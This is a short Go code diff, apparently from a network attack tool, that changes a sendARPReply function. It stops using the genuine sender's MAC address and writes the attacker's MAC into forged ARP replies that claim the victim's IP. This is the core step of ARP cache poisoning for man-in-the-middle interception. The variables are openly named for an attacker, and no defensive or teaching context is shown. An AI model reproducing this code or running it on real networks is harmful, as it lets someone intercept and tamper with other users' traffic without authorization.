@@ -97,10 +97,12 @@ func mapIPstoMAC(ips ...string) ([]*DeviceInfo, error) {
 
 func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle, logFile *os.File) error {
 	fromIP := net.ParseIP(from.IP)
-	fromMAC, err := net.ParseMAC(from.MAC)
-	if err != nil {
-		return err
-	}
+	/*
+		fromMAC, err := net.ParseMAC(from.MAC)
+		if err != nil {
+			return err
+		}
+	*/
 
 	toMAC, err := net.ParseMAC(to.MAC)
 	if err != nil {
@@ -123,8 +125,8 @@ func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle
 		HwAddressSize:     6,
 		ProtAddressSize:   4,
 		Operation:         layers.ARPReply,
-		SourceHwAddress:   fromMAC,
-		SourceProtAddress: fromIP,
+		SourceHwAddress:   attackerInfo.MAC,
+		SourceProtAddress: fromIP.To4(),
 		DstHwAddress:      toMAC,
 		DstProtAddress:    toIP.To4(),
 	}
